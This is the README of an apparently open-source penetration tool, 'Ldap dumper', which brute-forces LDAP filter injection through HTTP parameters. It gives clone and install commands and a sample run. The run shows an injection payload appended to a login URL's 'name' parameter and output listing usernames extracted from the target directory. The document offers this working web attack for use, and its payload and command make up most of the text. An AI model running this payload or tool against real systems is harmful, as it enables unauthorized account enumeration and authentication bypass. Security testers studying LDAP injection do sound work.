Ldap dumper is a semi-fast tool to bruteforce unescaped user-input
concatenations to [LDAP filters](http://www.ietf.org/rfc/rfc1960.txt) over HTTP
parameters.

# Installation

```
git clone git@github.com:droope/ldap-brute.git
cd ldap-brute/
pip install -r requirements.txt
```

# Sample run

```
LMint-PC ldap-dumper # python ldap-dumper.py 'http://vulnerable/ldap/example2.php?name=%s)(cn=*))%%00&password=' 'AUTHENTICATED as'
INFO - Entering wildcard brute mode for URL 'http://vulnerable/ldap/example2.php?name=%s)(cn=*))%%00&password='.
INFO - Valid initial values found: ['a', 'h']
50...
100...
150...
200...
250...
300...
350...
400...
450...
Valid values found (2.918s total time, 468 total HTTP requests):

admin2
hacker
```

# Usage

Please call `python ldap-brute.py --help` for more information, including examples.

# Contribute.

Feel free to submit pull requests. You can run the tests with 

```
python -m unittest discover
```
